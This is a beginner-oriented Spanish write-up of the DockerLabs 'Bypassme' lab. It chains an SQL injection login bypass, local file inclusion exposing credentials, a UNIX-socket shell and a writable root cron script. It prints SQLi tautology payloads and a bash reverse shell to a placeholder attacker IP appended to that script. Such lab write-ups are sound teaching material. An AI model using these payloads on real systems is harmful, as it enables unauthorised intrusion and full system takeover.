# DockerLabs — Writeup: Bypassme (Fácil)

¡Hola a todos!

En este writeup vamos a resolver la máquina **Bypassme** de la plataforma **DockerLabs**, catalogada con dificultad **Fácil**.

Este laboratorio es ideal para quienes están empezando en el mundo del hacking ético y el pentesting, ya que trabajaremos conceptos como:

- Inyección SQL (**SQLi**).
- Local File Inclusion (**LFI**).
- Enumeración de servicios.
- Abuso de **sockets UNIX**.
- Escalada de privilegios mediante tareas programadas (**Cron Jobs**).

---

## 1. Reconocimiento inicial

Lo primero que hacemos es comprobar que la máquina está activa en nuestra red.

```bash
ping -c 1 172.17.0.2
```

### Explicación para principiantes

La respuesta ICMP nos devuelve, entre otros datos, un valor **TTL (Time To Live)**.

En este caso observamos un TTL cercano a `64`, valor habitual en sistemas Linux/Unix.

> **Nota:** el TTL puede servir como pista para estimar el sistema operativo, pero por sí solo no permite identificarlo con total certeza.

A continuación realizamos un escaneo de puertos con **Nmap** para identificar puertos abiertos, servicios y posibles versiones.

```bash
nmap -sS -sCV -Pn -n 172.17.0.2
```

<img width="781" height="387" alt="Escaneo Nmap" src="https://github.com/user-attachments/assets/b1ce4b23-114a-44f3-bf25-9e0035307d3d" />

---

## 2. Enumeración web y acceso inicial

### Paso A: Descubrimiento de rutas con Gobuster

Para entender cómo está estructurada la aplicación web y localizar posibles archivos o directorios ocultos, realizamos una enumeración utilizando **Gobuster**.

```bash
gobuster dir \
  -u http://172.17.0.2 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

<img width="636" height="491" alt="Enumeración con Gobuster" src="https://github.com/user-attachments/assets/712e2929-5e55-4eba-b588-8906847182f2" />

---

### Paso B: Inyección SQL (SQLi)

Al acceder desde el navegador a:

```text
http://172.17.0.2
```

nos encontramos con un formulario de inicio de sesión ubicado en:

```text
/login.php
```

Durante las pruebas descubrimos que el formulario es vulnerable a una **inyección SQL clásica**.

Podemos intentar introducir una condición siempre verdadera —una tautología— para alterar la consulta SQL utilizada por la aplicación.

Por ejemplo:

```text
Username: admin' OR '1'='1' -- -
Password: ' OR '1'='1 -- -
```

La condición:

```sql
'1'='1'
```

siempre devuelve verdadero.

Además, la secuencia:

```sql
-- -
```

permite comentar el resto de la consulta SQL en determinados motores de bases de datos.

Como resultado, conseguimos evitar correctamente la comprobación normal de credenciales.

<img width="1560" height="681" alt="Bypass del login mediante SQLi" src="https://github.com/user-attachments/assets/9bc51b5c-3881-42dc-96bc-8f90ab30f933" />

Una vez dentro del panel encontramos una alerta relacionada con un archivo de logs.

Revisando el código fuente de la página mediante:

```text
CTRL + U
```

encontramos pistas sobre su posible ubicación.

<img width="722" height="926" alt="Código fuente de la aplicación" src="https://github.com/user-attachments/assets/32a46ff2-186b-4b24-8e3b-0ebfa0e5e0a0" />

---

### Paso C: Local File Inclusion (LFI)

Observamos que la aplicación utiliza un parámetro para cargar diferentes páginas:

```text
?page=...
```

Anteriormente, **Gobuster** había detectado un directorio llamado:

```text
/logs
```

Además, el código fuente nos había proporcionado pistas relacionadas con los archivos de registro.

Probamos entonces a manipular el parámetro `page`:

```text
http://172.17.0.2/index.php?page=/logs/logs.txt
```

La aplicación permite cargar directamente el contenido del archivo.

Esto confirma que el parámetro es vulnerable a **Local File Inclusion (LFI)** o, al menos, a una inclusión de archivos sin una validación adecuada de la ruta suministrada por el usuario.

<img width="2553" height="233" alt="Explotación del parámetro page" src="https://github.com/user-attachments/assets/0dfe5956-e45c-44a5-943d-eec83ee2eb7d" />

Al revisar el archivo encontramos información sensible que expone credenciales de usuario.

<img width="885" height="581" alt="Credenciales expuestas en los logs" src="https://github.com/user-attachments/assets/c0f84cea-1309-46d2-a020-c0b693c8f552" />

---

### Paso D: Acceso mediante SSH

Gracias a las credenciales encontradas en los logs podemos intentar conectarnos al servicio SSH.

```bash
ssh albert@172.17.0.2
```

Introducimos la contraseña obtenida anteriormente y conseguimos acceso al sistema como el usuario:

```text
albert
```

<img width="646" height="288" alt="Acceso SSH como albert" src="https://github.com/user-attachments/assets/504672ed-d184-4d7e-a198-81c2ba453d94" />

Con esto conseguimos nuestro **acceso inicial al sistema**.

---

## 3. Escalada de privilegios: `albert` → `conx`

Una vez dentro de la máquina como el usuario `albert`, comenzamos la enumeración interna del sistema.

Uno de los primeros pasos es revisar los procesos que se están ejecutando:

```bash
ps aux
```

<img width="963" height="326" alt="Enumeración de procesos con ps aux" src="https://github.com/user-attachments/assets/dc38e7c3-8f8a-4efb-876c-4f3ed30ee13f" />

Al revisar los procesos observamos uno perteneciente al usuario:

```text
conx
```

Este proceso está relacionado con un **socket UNIX** ubicado en:

```text
/home/conx/.cache/.sock
```

### ¿Qué es un socket UNIX?

Un socket UNIX es un mecanismo de comunicación entre procesos dentro del mismo sistema.

Funciona de forma parecida a una conexión de red, pero en lugar de utilizar una dirección IP y un puerto utiliza un archivo especial dentro del sistema de archivos.

Si un servicio privilegiado escucha en un socket UNIX y los permisos permiten que otro usuario se conecte a él, podría existir una vía para interactuar con dicho proceso.

> Conectarse a un socket UNIX no significa automáticamente obtener los privilegios de su propietario. Todo depende de cómo esté programado el servicio que escucha detrás del socket y de qué acciones permita realizar.

En este caso podemos conectarnos al socket utilizando **socat**:

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Tras establecer la conexión obtenemos una shell proporcionada por el proceso que se encuentra detrás del socket.

Comprobamos nuestra identidad:

```bash
whoami
```

<img width="593" height="70" alt="Shell como usuario conx" src="https://github.com/user-attachments/assets/fd273d51-fb2d-49b9-a37b-99dbb847c22c" />

El resultado confirma que ahora estamos ejecutando comandos como:

```text
conx
```

Hemos conseguido realizar movimiento lateral/escalada entre usuarios:

```text
albert → conx
```

---

## 4. Escalada de privilegios: `conx` → `root`

Nuestro siguiente objetivo es identificar alguna configuración insegura que permita ejecutar comandos con privilegios de `root`.

### Paso A: Enumeración de tareas programadas

Estando autenticados como `conx`, revisamos las tareas programadas del sistema.

En sistemas Linux estas tareas pueden encontrarse en archivos como:

```text
/etc/crontab
/etc/cron.d/
/var/spool/cron/
```

Durante la enumeración encontramos una tarea programada que ejecuta:

```text
/var/backups/backup.sh
```

cada minuto con privilegios de `root`.

<img width="548" height="328" alt="Cron Job vulnerable" src="https://github.com/user-attachments/assets/f7ab025a-5bda-41fd-9444-858c813a2265" />

### Paso B: Revisión de permisos del script

Ahora necesitamos comprobar quién es el propietario del script y qué usuarios pueden modificarlo.

Ejecutamos:

```bash
ls -al /var/backups/backup.sh
```

El resultado es:

```text
-rw-rw-r-- 1 conx root 246 May 22 2025 /var/backups/backup.sh
```

Aquí encontramos el problema.

El archivo pertenece al usuario:

```text
conx
```

y al grupo:

```text
root
```

Además, sus permisos indican:

```text
rw-rw-r--
```

El propietario (`conx`) tiene permisos de:

```text
rw-
```

Es decir:

- Lectura (`r`).
- Escritura (`w`).

Por lo tanto, nuestro usuario puede modificar un script que posteriormente será ejecutado automáticamente por `root`.

Este es un caso clásico de **escalada de privilegios mediante un Cron Job mal configurado**.

### ¿Por qué es peligroso?

Tenemos la siguiente situación:

```text
conx puede modificar backup.sh
          ↓
root ejecuta backup.sh automáticamente
          ↓
nuestros comandos terminan siendo ejecutados por root
```

### Paso C: Inyección de una Reverse Shell

Aprovechando los permisos de escritura sobre el script, añadimos una reverse shell en Bash:

```bash
echo '/bin/bash -i >& /dev/tcp/TU_IP_DE_ATACANTE/1337 0>&1' >> /var/backups/backup.sh
```

<img width="700" height="46" alt="Modificación del script backup.sh" src="https://github.com/user-attachments/assets/fb1db9a6-8abe-43de-b5c3-429aa0ebccb1" />

La línea añadida hará que, cuando `root` ejecute el script, la máquina víctima intente establecer una conexión hacia nuestra máquina atacante por el puerto:

```text
1337
```

Antes de que el Cron Job vuelva a ejecutarse, abrimos un listener con **Netcat** en nuestra máquina Kali:

```bash
nc -nvlp 1337
```

<img width="682" height="145" alt="Listener de Netcat" src="https://github.com/user-attachments/assets/127df9ff-ff18-496d-8486-89e42c11e861" />

Cuando se ejecuta nuevamente la tarea programada, recibimos la conexión.

Podemos comprobar nuestros privilegios ejecutando:

```bash
whoami
```

Si todo ha funcionado correctamente, obtenemos:

```text
root
```

---

## 5. Resumen de la cadena de ataque

La máquina puede resumirse de la siguiente manera:

```text
Reconocimiento
      ↓
Nmap
      ↓
Enumeración web con Gobuster
      ↓
SQL Injection
      ↓
Acceso al panel
      ↓
Local File Inclusion
      ↓
Credenciales expuestas en logs
      ↓
SSH como albert
      ↓
Enumeración de procesos
      ↓
Socket UNIX vulnerable
      ↓
Usuario conx
      ↓
Cron Job ejecutado por root
      ↓
Script modificable por conx
      ↓
Reverse Shell
      ↓
ROOT
```

---

## 6. Vulnerabilidades encontradas

Durante la resolución de la máquina encontramos varios fallos de seguridad:

| Vulnerabilidad | Impacto |
|---|---|
| SQL Injection | Bypass del sistema de autenticación |
| Credenciales expuestas en logs | Obtención de credenciales válidas |
| Local File Inclusion | Lectura de archivos accesibles desde la aplicación |
| Socket UNIX inseguro | Escalada entre usuarios |
| Script de Cron modificable | Ejecución de comandos como `root` |

---

## 7. Conclusión

**Bypassme** es una máquina sencilla pero muy interesante para practicar una cadena de ataque completa.

Durante el laboratorio hemos trabajado desde la enumeración inicial hasta conseguir privilegios de administrador:

```text
Web → SQLi → LFI → SSH → Socket UNIX → Cron Job → Root
```

La máquina también demuestra un concepto muy importante en pentesting: una vulnerabilidad aislada no siempre permite comprometer completamente un sistema.

Sin embargo, varios fallos aparentemente pequeños pueden encadenarse hasta provocar una **comprometición total de la máquina**.
